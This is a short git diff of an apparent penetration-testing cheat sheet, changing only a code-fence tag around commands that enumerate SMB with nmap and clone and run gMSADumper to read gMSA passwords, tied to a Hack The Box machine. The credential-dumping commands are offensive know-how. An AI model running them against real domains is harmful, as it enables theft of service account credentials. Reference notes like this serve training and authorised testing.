@@ -102,7 +102,7 @@ nmap --script "safe or smb-enum-*" -p 445 <target ip>
 
 Read gMSA password (```ReadGMSAPassword``` and ```AllowedToDelegate``` rights) (HTB BOX:Intelligence)
 
-```
+```shell
 git clone https://github.com/micahvandeusen/gMSADumper.git
 python3 gMSADumper.py -u <username> -p <password> -d <domain>
 ```
